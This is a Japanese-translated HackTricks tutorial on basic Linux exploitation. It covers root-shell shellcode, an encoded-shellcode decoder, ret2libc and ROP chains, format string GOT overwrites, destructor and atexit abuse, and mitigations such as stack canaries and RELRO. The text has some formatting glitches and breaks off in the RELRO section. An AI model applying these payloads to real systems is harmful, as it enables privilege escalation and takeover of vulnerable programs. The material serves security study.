# Linux Exploiting (基本) (SPA)

## Linux Exploiting (基本) (SPA)

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* **HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>

## **ASLR**

アドレス空間のランダム化

**グローバルなランダム化(ASLR)を無効にする (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
グローバルなランダム化を再有効化: echo 2 > /proc/sys/kernel/randomize\_va\_space

**実行時にランダム化を無効にする** (root不要):\
setarch \`arch\` -R ./ejemplo argumentos\
setarch \`uname -m\` -R ./ejemplo argumentos

**スタック実行保護を無効にする**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack ejemplo.c -o ejemplo

**コアファイル**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**テキスト**\
**データ**\
**BSS**\
**ヒープ**

**スタック**

**BSSセクション**: 初期化されていないグローバル変数または静的変数
```
static int i;
```
**DATAセクション**: 初期化されたグローバル変数または静的変数
```
int i = 5;
```
**セクション TEXT**: コードの命令 (opcodes)

**セクション HEAP**: 動的に予約されたバッファ (malloc(), calloc(), realloc())

**セクション STACK**: スタック (渡された引数、環境変数 (env)、ローカル変数...)

## **1.スタックオーバーフロー**

> バッファオーバーフロー、バッファオーバーラン、スタックオーバーラン、スタックスマッシング

セグメンテーションフォールトまたはセグメント違反: プロセスに割り当てられていないメモリアドレスにアクセスしようとしたときに発生します。

プログラム内の関数のアドレスを取得する方法は以下の通りです:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### sys\_execveへのコール

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

カーネルの割り込みを見る: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eaxをクリア\
xor ebx, ebx ; ebx = 0 引数はなし\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; システムコールを実行

**nasm -f elf assembly.asm** —> .oファイルを返す\
**ld assembly.o -o shellcodeout** —> アセンブリコードから実行可能ファイルを作成し、**objdump**でオペコードを取得\
**objdump -d -Mintel ./shellcodeout** —> 実際にシェルコードであることを確認し、オペコードを取得

**シェルコードが機能することを確認**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
システムコールが正しく行われていることを確認するためには、前述のプログラムをコンパイルし、システムコールが **strace ./PROGRAMA\_COMPILADO** に表示されるべきです。

シェルコードを作成する際には、トリックを使うことができます。最初の命令はcallへのjumpです。callは元のコードを呼び出し、さらにEIPをスタックにプッシュします。call命令の後には、必要な文字列を挿入しているので、そのEIPを使って文字列を指し示し、コードの実行を続けることができます。

例 **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**EJを使用してスタック(/bin/sh)を利用する:**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Hunter（エッグハンター）:**

プロセスに関連付けられたメモリページを走査し、そこに保存されているシェルコード（シェルコードに設定された何らかの署名を探す）を探す小さなコードです。コードを注入するためのスペースが非常に小さい場合に役立ちます。

**ポリモーフィックシェルコード**

暗号化されたシェルであり、それらを復号化し、Call-Popのトリックを使用してそこにジャンプする小さなコードが含まれています。これは**シーザー暗号化の例**です：
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **Frame Pointer (EBP) 攻撃**

EBPは変更できるがEIPは変更できない状況で役立ちます。

関数から抜ける際には、次のアセンブリコードが実行されることが知られています:
```
movl               %ebp, %esp
popl                %ebp
ret
```
```
このように、関数（fvuln）から抜ける際にEBPを変更できる場合、fvulnを呼び出した別の関数が終了すると、そのEIPも変更できます。

fvulnでは、シェルコードのアドレス+4（popのために4を加算する必要があります）を指す偽のEBPを導入できます。そうすると、関数から抜ける際にESPに&(\&Shellcode)+4の値が入り、popによってESPから4が引かれ、retが実行されるときにESPはシェルコードのアドレスを指します。

**Exploit：**\
\&Shellcode + "AAAA" + SHELLCODE + 埋め草 + &(\&Shellcode)+4

**Off-by-One Exploit**\
EBPの最下位バイトのみを変更することが許されます。前述の攻撃を行うことができますが、シェルコードのアドレスを保持するメモリはEBPと最初の3バイトを共有する必要があります。

## **4. Libcへのリターンメソッド**

スタックが実行不可能である場合や、変更するためのバッファが非常に小さい場合に有用な方法です。

ASLRは、実行のたびに関数がメモリの異なる位置にロードされるため、この方法は効果的でない場合があります。しかし、プログラムが常に同じアドレスで実行されるリモートサーバーの場合は有用です。

* **cdecl(C宣言)** 引数をスタックに入れ、関数から抜けた後にスタックをクリアします。
* **stdcall(標準呼び出し)** 引数をスタックに入れ、呼び出された関数がスタックをクリアします。
* **fastcall** 最初の2つの引数をレジスタに入れ、残りをスタックに入れます。

libcのsystem命令のアドレスを指定し、通常は環境変数からの文字列“/bin/sh”を引数として渡します。さらに、シェルが不要になった後にプログラムが問題なく終了するように（ログを書かないように）、exit関数のアドレスを使用します。

**export SHELL=/bin/sh**

必要なアドレスを見つけるには、**GDB**内で次のように調べます：\
**p system**\
**p exit**\
**rabin2 -i 実行可能ファイル** —> プログラムがロードする際に使用するすべての関数のアドレスを表示します\
（startやブレークポイント内で）：**x/500s $esp** —> ここで/bin/shの文字列を探します

これらのアドレスを持っていれば、**exploit**は次のようになります：

“A” \* EBPまでの距離 + 4（EBP：4つの"A"でも良いですが、セグメンテーションエラーを避けるために実際のEBPが望ましい）+ **system**のアドレス（EIPを上書きします）+ **exit**のアドレス（system("/bin/sh")から抜けた後、この関数が呼ばれます。スタックの最初の4バイトは次のEIPアドレスとして扱われます）+ “**/bin/sh**”のアドレス（systemに渡される引数）

この方法では、EIPはsystemのアドレスで上書きされ、systemは引数として“/bin/sh”の文字列を受け取り、この関数から抜けるとexit()関数が実行されます。

関数のアドレスのいくつかのバイトがヌルまたはスペース（\x20）である場合があります。その場合、その関数の前のアドレスを逆アセンブルすることができます。おそらくいくつかのNOPがあり、それらのいずれかを直接関数ではなく呼び出すことができます（例：> x/8i system-4）。

この方法は、opcode **ret**を使用して**call**ではなく関数（例：system）を呼び出すと、関数は最初の4バイトが**EIP**に戻るアドレスであると理解するために機能します。

この方法での興味深いテクニックは、**strncpy()**を使用してペイロードをスタックからヒープに移動し、その後**gets()**を使用してそのペイロードを実行することです。

もう一つの興味深いテクニックは、任意のメモリ領域に所望の権限を割り当てることができる**mprotect()**の使用です。これはBSD、MacOS、OpenBSDで有効または有効でしたが、Linuxでは有効ではありません（書き込みと実行の権限を同時に付与することを制御します）。この攻撃を使用すると、スタックを再び実行可能として設定することができます。

**関数のチェーン**

前述のテクニックに基づいて、このエクスプロイトの形式は次のようになります：\
埋め草 + \&関数1 + \&pop;ret; + \&arg\_fun1 + \&関数2 + \&pop;ret; + \&arg\_fun2 + …

この方法では、呼び出す関数をチェーンすることができます。さらに、複数の引数を使用する関数を使用する場合は、必要な引数（例：4）を配置し、4つの引数を配置し、opcodesを持つアドレスを探します：pop, pop, pop, pop, ret —> **objdump -d 実行可能ファイル**

**フレームの偽造によるチェーン（EBPのチェーン）**

EBPを操作する能力を利用して、EBPと"leave;ret"を通じて複数の関数の実行をチェーンすることです。

埋め草

* EBPには、次のように指す偽のEBPを配置します：2番目のEBP\_falso + 実行する関数：(\&system() + \&leave;ret + &“/bin/sh”)
* EIPには、関数&(leave;ret)のアドレスを配置します。

シェルコードは、例えば、2番目のEBP\_falso + \&system() + &(leave;ret;) + &“/bin/sh”のように、シェルコードの次の部分へのアドレスで始まります。

2番目のEBPは、次のようになります：3番目のEBP\_falso + \&system() + &(leave;ret;) + &“/bin/ls”

このシェルコードは、アクセス可能なメモリの部分に無限に繰り返すことができ、小さなメモリチャンクに簡単に分割できるシェルコードを実現できます。

（関数の実行をチェーンすることで、以前に見たEBPとret2libの脆弱性を混合します）

## **5.補完的な方法**

**Ret2Ret**

EIPにスタックのアドレスを入れることができない場合（EIPに0xbfが含まれていないことを確認する）や、シェルコードの位置を計算できない場合に有用です。しかし、脆弱な関数がパラメータ（ここにシェルコードが入ります）を受け入れる場合があります。

この方法では、EIPを**ret**のアドレスに変更すると、次のアドレス（関数の最初の引数のアドレス）がロードされます。つまり、シェルコードがロードされます。

エクスプロイトは次のようになります：SHELLCODE + 埋め草（EIPまで）+ **\&ret**（スタックの次のバイトがシェルコードの開始を指すため、引数として渡されたパラメータのアドレスがスタックに入ります）

**strncpy**のような関数は、完了するとスタックからシェルコードのアドレスを削除するため、このテクニックは不可能になることがあります。つまり、関数に引数として渡されるアドレス（シェルコードを保持するアドレス）が0x00に変更されるため、2番目の**ret**を呼び出すと0x00に遭遇し、プログラムがクラッシュします。
```
```
**Ret2PopRet**
```
```markdown
最初の引数を制御できないが、2番目または3番目の引数を制御できる場合、EIPをpop-retまたはpop-pop-retのアドレスで上書きできます。

**ムラットの技術**

Linuxでは、すべてのプログラムは0xbfffffffからマッピングされます。

Linuxで新しいプロセスのスタックがどのように構築されるかを見ると、シェルコードが唯一の変数である環境でプログラムが起動されるようなエクスプロイトを開発できます。このアドレスは次のように計算できます：addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)

この方法で、シェルコードを含む環境変数のアドレスを簡単に取得できます。

これは、execle関数が望む環境変数のみを持つ環境を作成できるためです。

**ESPへのジャンプ：Windowsスタイル**

ESPは常にスタックの始まりを指しているため、この技術はEIPを**jmp esp**または**call esp**への呼び出しのアドレスに置き換えることで構成されます。この方法では、EIPの上書き後にシェルコードを保存します。なぜなら、**ret**を実行した後、ESPは次のアドレスを指しているからです。ちょうどシェルコードが保存された場所です。

WindowsまたはLinuxでASLRが有効でない場合、共有オブジェクトに格納されている**jmp esp**または**call esp**を呼び出すことができます。ASLRが有効な場合は、脆弱なプログラム内で探すことができます。

さらに、EIPの破損後にシェルコードをスタックの中間ではなく配置できるため、関数の中で実行されるpushやpop命令がシェルコードに触れることなく（関数のスタックの中間に配置された場合に起こり得る）、シェルコードを保護できます。

これに非常に似ている方法として、シェルコードが保存されているアドレスを返す関数がわかっている場合、**call eax**または**jmp eax (ret2eax)**を呼び出すことができます。

**ROP (Return Oriented Programming) または borrowed code chunks**

呼び出されるコードの断片はガジェットとして知られています。

この技術は、**ret2libc**の技術と**pop,ret**の使用を組み合わせて、異なる関数呼び出しを連鎖させることで構成されます。

一部のプロセッサアーキテクチャでは、各命令は32ビットのセットです（例：MIPS）。しかし、Intelでは命令のサイズは可変であり、複数の命令がビットのセットを共有することがあります。例えば：

**movl $0xe4ff, -0x(%ebp)** —> 0xffe4のバイトを含み、これは**jmp \*%esp**とも翻訳されます。

この方法では、元のプログラムには存在しないいくつかの命令を実行できます。

**ROPgadget.py**はバイナリ内の値を見つけるのに役立ちます。

このプログラムは、**payloads**を作成するのにも使用されます。ROPを抽出したいライブラリを指定すると、そのライブラリがあるアドレスを与えると、Pythonでpayloadを生成します。このpayloadはシェルコードとして使用する準備ができています。さらに、システムコールを使用するため、実際にはスタック上で何も実行せず、**ret**を介して実行されるROPのアドレスのみを保存します。このpayloadを使用するには、**ret**命令を介してpayloadを呼び出す必要があります。

**Integer overflows**

このタイプのオーバーフローは、変数が渡された数値の大きさをサポートする準備ができていない場合に発生します。これは、符号ありと符号なしの変数の混同などが原因である可能性があります。例えば：
```
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
前の例では、プログラムが2つのパラメータを期待していることがわかります。最初のパラメータは次の文字列の長さで、2番目のパラメータはその文字列です。

最初のパラメータに負の数を渡すと、len < 256となり、そのフィルターを通過します。さらに、lはunsigned intなので非常に大きくなり、strlen(buffer)もlより小さくなります。

このタイプのオーバーフローは、プログラムのプロセスに何かを書き込むことを目指しているのではなく、不適切に設計されたフィルターを超えて他の脆弱性を悪用することを目的としています。

**初期化されていない変数**

初期化されていない変数が取りうる値はわかっておらず、それを観察することが興味深いかもしれません。前の関数の変数が攻撃者によって制御されている場合、その変数が取っていた値を取る可能性があります。

## **フォーマット文字列**

C言語では、**`printf`** は文字列を**出力**するために使用できる関数です。この関数が期待する**最初のパラメータ**は、**フォーマッタを含む生のテキスト**です。期待される**次のパラメータ**は、生のテキストから**フォーマッタ**を**置換**するための**値**です。

脆弱性は、攻撃者のテキストがこの関数の最初の引数として置かれたときに現れます。攻撃者は、**printfフォーマット**文字列の機能を悪用して特別な入力を作成し、任意のデータを任意のアドレスに**書き込む**ことができます。この方法で、**任意のコードを実行**することが可能になります。

フォーマッタ:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`** は**書かれたバイト数**を**指定されたアドレス**に**書き込みます**。必要な16進数のバイト数だけ**書き込む**ことで、**任意のデータ**を**書き込む**ことができます。
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

これは、プログラムによって使用される**外部関数**への**アドレス**が含まれているテーブルです。

このテーブルへのアドレスを取得するには: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

GEFで**実行可能ファイル**を**ロード**した後、GOTにある**関数**を**確認**できることに注目してください: `gef➤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

GEFを使用して**デバッグ**セッションを**開始**し、**`got`** を実行してgotテーブルを表示します:

![](<../../.gitbook/assets/image (621).png>)

バイナリでは、GOTには関数の**アドレス**または関数アドレスをロードする**PLT**セクションへの**アドレス**があります。このエクスプロイトの目的は、後で実行される関数のGOTエントリを**`system`** **関数**のPLTの**アドレス**で**上書き**することです。理想的には、ユーザーが制御できるパラメーターで呼び出される**関数**のGOTを**上書き**します（そうすることで、system関数に送られるパラメーターを制御できます）。

もし**`system`** がスクリプトによって**使用されていない**場合、system関数はGOTにエントリーがありません。このシナリオでは、最初に`system`関数のアドレスを**リーク**する必要があります。

**Procedure Linkage Table**はELFファイル内の**読み取り専用**テーブルで、解決が必要なすべての**シンボル**を格納しています。これらの関数のいずれかが呼び出されると、GOTはフローをPLTに**リダイレクト**し、関数のアドレスを解決してGOTに書き込みます。
その後、そのアドレスへの呼び出しが行われると、関数は直接呼び出され、解決する必要はありません。

PLTのアドレスは**`objdump -j .plt -d ./vuln_binary`** で確認できます。

### **Exploit Flow**

前述のように、目標は後で呼び出されるGOTテーブルの**関数**の**アドレス**を**上書き**することです。理想的には、実行可能セクションにあるシェルコードへの**アドレス**を設定できますが、実行可能セクションにシェルコードを書き込むことはほとんど不可能です。
したがって、別のオプションは、ユーザーからの**引数**を**受け取る**関数を**上書き**し、それを**`system`** **関数**に**ポイント**することです。

アドレスを書き込むには、通常2ステップが行われます: 最初にアドレスの2バイトを書き込み、次に残りの2バイトを書き込みます。これを行うには**`$hn`** が使用されます。

**HOB**はアドレスの上位2バイトを指します\
**LOB**はアドレスの下位2バイトを指します

したがって、フォーマット文字列の動作方法により、\[HOB, LOB]のうち小さい方を**最初に書き込み**、次にもう一方を書き込む必要があります。

もし HOB < LOB の場合\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

もし HOB > LOB の場合\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NºParam\_dir\_HOB LOB\_shell-HOB\_shell NºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Format String Exploit Template**

GOTをフォーマット文字列を使用してエクスプロイトするための**テンプレート**はこちらで見つけることができます:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

基本的にこれは、プログラムが終了する前に**呼び出される関数**が含まれている構造です。これは、アドレスにジャンプして**シェルコード**を呼び出すことができる場合や、フォーマット文字列を2回目**利用するために**メインに戻る必要がある場合に興味深いです。
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
以下は、メモリからの内容をダンプするためにフォーマット文字列を悪用する方法についてです。

例えば、以下の状況では、スタック内のローカル変数がフラグを指しています。フラグへのポインタがメモリのどこにあるかを見つけることができれば、printfにそのアドレスにアクセスさせてフラグを表示させることができます。

したがって、フラグは **0xffffcf4c** にあります。

![](<../../.gitbook/assets/image (618) (2).png>)

そして、リークからフラグへのポインタが8番目のパラメータにあることがわかります。

![](<../../.gitbook/assets/image (623).png>)

したがって、8番目のパラメータにアクセスすることでフラグを取得できます。

![](<../../.gitbook/assets/image (624).png>)

前述のエクスプロイトに従って、内容をリークすることができると気づいたら、実行可能セクションがロードされている場所へのポインタを`printf`に設定し、それを完全にダンプすることができます！

### **DTOR**

{% hint style="danger" %}
現在では、dtorセクションを持つバイナリを見つけることは非常に珍しいです。
{% endhint %}

デストラクタは、プログラムが終了する前に実行される関数です。
`__DTOR_END__`にシェルコードへのアドレスを書き込むことができれば、プログラムが終了する前にそれが実行されます。
このセクションのアドレスを取得するには：
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
通常、**DTOR** セクションは `ffffffff` と `00000000` の**間**に見つかります。そのため、これらの値が見えるだけなら、**登録された関数がない**ことを意味します。したがって、**`00000000`** を**上書き**して、実行する**シェルコード**への**アドレス**に変更します。

### **フォーマット文字列からバッファオーバーフローへ**

**sprintf** はフォーマットされた文字列を**変数に移動**します。したがって、文字列の**フォーマットを悪用**して、コンテンツがコピーされる変数で**バッファオーバーフローを引き起こす**ことができます。\
例えば、ペイロード `%.44xAAAA` は変数に**44B+"AAAA"を書き込み**、バッファオーバーフローを引き起こす可能性があります。

### **\_\_atexit 構造体**

{% hint style="danger" %}
現在、これを**悪用するのは非常に珍しい**です。
{% endhint %}

**`atexit()`** は、他の**関数がパラメータとして渡される関数**です。これらの**関数**は、**`exit()`** の実行時や**main** の**リターン**時に**実行されます**。\
これらの関数の**アドレス**を変更して、例えばシェルコードを指すようにすることができれば、**プロセスの制御**を**獲得**できますが、現在はより複雑です。\
現在、実行される関数への**アドレス**は、いくつかの構造体の後ろに**隠されており**、最終的にそれが指すアドレスは関数のアドレスではなく、**ランダムなキー**でXOR暗号化されたものです。したがって、現在この攻撃ベクトルは、少なくともx86や**x64\_86**では**あまり役に立ちません**。\
**暗号化関数**は**`PTR_MANGLE`** です。**他のアーキテクチャ**、例えばm68k、mips32、mips64、aarch64、arm、hppaなどは、入力と同じものを返すため、**暗号化関数を実装していません**。したがって、これらのアーキテクチャはこのベクトルで攻撃可能です。

### **setjmp() & longjmp()**

{% hint style="danger" %}
現在、これを**悪用するのは非常に珍しい**です。
{% endhint %}

**`setjmp()`** は**コンテキスト**（レジスタ）を**保存**することができます。\
**`longjmp()`** は**コンテキスト**を**復元**することができます。\
**保存されるレジスタ**は: `EBX, ESI, EDI, ESP, EIP, EBP`です。\
問題は、EIPとESPが**`PTR_MANGLE`** 関数によって渡されるため、**この攻撃に対して脆弱なアーキテクチャは上記と同じ**です。\
これらはエラー回復や割り込みに役立ちます。\
しかし、読んだところによると、他のレジスタは保護されていないため、関数内に `call ebx`、`call esi`、または `call edi` がある場合、制御を取ることができます。または、EBPを変更してESPを変更することもできます。

**VTable と VPTR in C++**

各クラスには、**メソッドへのポインタの配列**である**Vtable**があります。

各**クラス**のオブジェクトには、そのクラスの配列を指す**VPTR**があります。VPTRは各オブジェクトのヘッダーの一部であるため、**VPTR**の**上書き**に成功すれば、関数を実行するとシェルコードに行くように**変更**することができます。

## **予防策と回避策**

**ASLR はそれほどランダムではない**

PaXはプロセスのアドレス空間を3つのグループに分けます：

初期化されたコードとデータ、未初期化されたデータ：.text、.data、.bss —> delta\_exec変数の16ビットのエントロピー、この変数は各プロセスでランダムに初期化され、初期アドレスに加算されます

mmap()によって割り当てられたメモリと共有ライブラリ —> 16ビット、delta\_mmap

スタック —> 24ビット、delta\_stack —> 実際には11（10番目から20番目のバイトまで） —> 16バイトにアラインされている —> スタックの実際の可能なアドレスは524,288

環境変数と引数はスタック上のバッファよりも少なく移動されます。

**Return-into-printf**

これは、バッファオーバーフローをフォーマット文字列のエラーに変換する技術です。EIPを関数のprintfにポイントするように置き換え、プロセスの状態に関する値を取得するために操作されたフォーマット文字列を引数として渡すことで構成されています。

**ライブラリへの攻撃**

ライブラリは16ビットのランダム性を持つ位置にあります = 65636の可能なアドレス。脆弱なサーバーがfork()を呼び出すと、メモリアドレス空間は子プロセスにクローンされ、そのまま保持されます。そのため、libcのusleep()関数に"16"を引数として渡し、通常よりも応答に時間がかかる場合、その関数が見つかったと考えることができます。その関数がどこにあるかがわかれば、delta\_mmapを取得し、他のアドレスを計算することができます。

ASLRが機能していることを確実にする唯一の方法は、64ビットアーキテクチャを使用することです。そこではブルートフォース攻撃はありません。

**StackGuard と StackShield**

**StackGuard** はEIPの前に —> 0x000aff0d(null, \n, EndOfFile(EOF), \r) を挿入します —> recv()、memcpy()、read()、bcoy() は依然として脆弱であり、EBPは保護されません

**StackShield** はStackGuardよりも洗練されています

グローバルリターンスタック（Global Return Stack）というテーブルにすべての戻りEIPアドレスを保存し、オーバーフローがダメージを引き起こさないようにします。さらに、両方のアドレスを比較してオーバーフローが発生したかどうかを確認できます。

また、リターンアドレスを上限値と照合して、EIPが通常と異なる場所、例えばデータスペースに移動した場合にそれを知ることができます。しかし、これはRet-to-lib、ROPs、またはret2retで回避されます。

StackShieldもローカル変数を保護していないことがわかります。

**Stack Smash Protector (ProPolice) -fstack-protector**

EBPの前にカナリアを配置します。ローカル変数を並べ替えて、バッファが最も高い位置にあり、他の変数を上書きできないようにします。

さらに、スタックの上に渡された引数の安全なコピーを作成し（ローカル変数の上に）、これらのコピーを引数として使用します。

8要素未満の配列やユーザーの構造体の一部であるバッファを保護することはできません。

カナリアは "/dev/urandom" から取得されたランダムな数字であり、そうでなければ 0xff0a0000 です。TLS（Thread Local Storage）に保存されます。スレッドは同じメモリ空間を共有していますが、TLSは各スレッドのグローバル変数や静的変数があるエリアです。しかし、原則としてこれらは親プロセスからコピーされますが、子プロセスはこれらのデータを親や他の子供たちのデータを変更することなく変更することができます。問題は、fork()を使用しても新しいカナリアを作成しない場合、すべてのプロセス（親と子）が同じカナリアを使用することです。i386ではgs:0x14に、x86\_64ではfs:0x28に保存されます。

この保護は、攻撃される可能性のあるバッファを持つ関数を特定し、関数の始めにカナリアを配置するコードと、最後にそれをチェックするコードを含めます。

fork()関数は親プロセスの正確なコピーを作成するため、同じ理由で、Webサーバーがfork()を呼び出すと、使用されているカナリアをバイトごとにブルートフォース攻撃で突き止めることができます。

fork()の後にexecve()関数を使用すると、スペースが上書きされ、攻撃は不可能になります。vfork()は、子プロセスが書き込みを試みるまで、複製を作成せずに子プロセスを実行することを可能にします。

**Relocation Read-Only (RELRO)**

### Relro

**Relro (Read only Relocation)** は、NXと同様にメモリの権限に影響を与えます。違いは、NXがスタックを実行可能にするのに対し、RELROは**特定のものを読み取り専用**にするため、それらに**書き込むことができません**。私が見た中で最も一般的な障害は、後で説明する**`got` テーブルの上書き**を防ぐことです。`got` テーブルはlibc関数のアドレスを保持しているため、バイナリはアドレスを知り、それらを呼び出すことができます。relroがあるバイナリとないバイナリの`got` テーブルエントリのメモリ権限がどのように見えるか見てみましょう。

relroあり：
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
